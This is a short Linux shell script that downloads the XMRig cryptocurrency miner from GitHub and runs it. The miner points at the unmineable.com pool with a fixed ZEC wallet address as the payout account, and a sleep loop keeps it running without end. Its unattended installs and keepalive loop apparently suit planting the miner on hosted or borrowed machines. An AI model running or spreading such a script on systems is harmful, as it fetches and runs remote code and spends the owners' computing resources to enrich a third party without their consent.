#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz
tar xf xmrig-6.12.1-linux-static-x64.tar.gz
cd xmrig-6.12.1
./xmrig -o rx.unmineable.com:3333 -a rx -k -u  ZEC:t1fqfZ6CUL5oVgxhQLx3JeAQxz2noq6b62o.sato#h891-5bxs
while [ 1 ]; do
sleep 3
done
sleep 999